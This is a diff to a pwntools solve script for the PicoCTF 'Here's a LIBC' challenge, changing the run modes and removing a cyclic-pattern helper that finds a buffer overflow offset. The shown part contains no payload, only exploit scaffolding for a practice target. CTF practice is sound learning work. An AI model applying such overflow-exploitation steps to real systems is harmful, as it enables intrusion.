@@ -4,12 +4,12 @@
 Toast's submission for the PicoCTF challenge Here's a LIBC.
 
 This script can be used in the following manner:
-python3 ./solve.py <REMOTE/LOCAL>
+python3 ./solve.py <REMOTE/GDB>
 
 Args:
-    param1: LOCAL will operate locally on the user's machine.
-            REMOTE will connect to the CTF webserver and grab the flag.
-            If no parameter is specified, the program will operate with GDB attached.
+    param1: REMOTE will connect to the CTF webserver and grab the flag.
+            GDB will operate with GDB attached.
+            If no parameter is specified, the program will operate locally.
 
 Returns:
     The flag to solve the challenge.
@@ -26,7 +26,6 @@ context.log_level = 'info'
 context.terminal = ['gnome-terminal', '-e']
 
 gdb_script = """
-b scanf
 """
 
 def conn():
@@ -35,21 +34,11 @@ def conn():
 
     if args.get('REMOTE'):
         io = remote('mercury.picoctf.net', 24159)
-    elif args.get('LOCAL'):
-        io = process([exe.path])
-    else:
+    elif args.get('GDB'):
         io = gdb.debug([exe.path], gdb_script)
-
+    else:
+        io = process([exe.path])
     return io
-
-def get_offset():
-    with conn() as io:
-        pattern = cyclic(n=8, length=150)
-        io.sendline(pattern)
-    
-    offset = cyclic_find(0x6161616161616172, n=8)
-    print(f"Offset = {offset}")
-    return offset
 
 
 def main():
